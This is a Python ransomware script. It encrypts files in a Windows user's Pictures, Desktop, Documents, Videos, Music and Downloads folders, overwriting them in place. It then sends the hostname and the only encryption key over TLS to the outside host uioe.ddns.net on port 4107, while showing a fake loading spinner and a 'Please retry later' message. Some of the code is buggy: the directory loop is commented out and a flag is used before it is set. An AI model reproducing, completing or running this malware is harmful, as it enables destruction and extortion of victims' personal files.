from cryptography.fernet import Fernet
from glob import glob
from socket import socket
from socket import AF_INET, SOCK_STREAM, gethostname
from network import send_msg_dict
import ssl
from json import load
from threading import Thread
from sys import stdout
from itertools import cycle
from time import sleep
from random import random
from math import floor
from os import environ

user = environ['USERNAME']
dirs = [f'C:\\Users\\{user}\\Pictures\\**\\*', f'C:\\Users\\{user}\\Desktop\\**\\*', 
f'C:\\Users\\{user}\\Documents\\**\*', f'C:\\Users\\{user}\\Videos\\**\\*',
f'C:\\Users\\{user}\\Music\\**\*', f'C:\\Users\\{user}\\Downloads\\**\\*']


KEY = Fernet.generate_key()
fernet = Fernet(KEY)
ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)


with open('ext.json', 'r') as file:
    extensions = load(file)


def loading():
    for c in cycle(['|', '/', '-', '\\']):
        if done:
            break
        stdout.write('\rloading please wait [' + c + ']')
        stdout.flush()
        sleep(0.1)
    stdout.write('\rDone!                             ')


def encryption(s: socket):
    #for dir in dirs:
    for ext in extensions:
        for file in glob(dir + ext, recursive=True):
            with open(file, 'rb') as t:
                enc = fernet.encrypt(t.read())
            with open(file, 'wb') as f:
                f.write(enc)
                
    msg = {'Hostname': gethostname(), 'key': KEY.decode()}
    send_msg_dict(s, msg)
    
    

def main():
    with socket(AF_INET, SOCK_STREAM) as s:
        s = ctx.wrap_socket(s, server_hostname='uioe.ddns.net')
        try:
            s.connect(('uioe.ddns.net', 4107))
            encryption(s)
        except:
            print('Please retry later')
    global done
    done = False
    Thread(target = loading).start()
    sleep(floor(random()*10))
    done = True
    

if __name__ == '__main__':
    main()
    
    

